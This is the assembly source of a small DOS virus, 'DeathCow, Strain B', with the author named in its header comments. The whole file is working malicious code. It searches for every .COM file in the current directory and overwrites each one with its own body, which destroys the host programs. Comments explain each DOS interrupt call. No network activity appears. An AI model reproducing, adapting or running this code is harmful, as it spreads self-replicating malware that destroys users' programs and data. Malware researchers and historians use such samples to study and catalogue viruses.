; DeathCow, Strain B
;
; Written by Nowhere Man, derived from DeathCow (author unknown)


virus_length    equ     finish - start

    code    segment 'CODE'
        assume cs:code,ds:code,es:code,ss:code

        org 0100h

start       label   near

main        proc    near
        mov ah,04Eh         ; DOS find first file function
        mov dx,offset com_spec  ; DX points to "*.COM"
        int 021h

infect_file:    mov ax,03D01h       ; DOS open file function, write-only
        mov dx,09Eh         ; DX points to the found file
        int 021h

        xchg    bx,ax           ; BX holds file handle

        mov ah,040h         ; DOS write to file function
        mov cl,virus_length     ; CL holds # of bytes to write
        mov dx,offset main      ; DX points to start of code
        int 021h

        mov ah,03Eh         ; DOS close file function
        int 021h

        mov ah,04Fh         ; DOS find next file function
        int 021h
        jnc infect_file     ; Infect next file, if found

        ret             ; RETurn to DOS

com_spec    db  "*.COM",0       ; Files to infect:  all .COM files
main        endp

finish      label   near

    code    ends
        end main
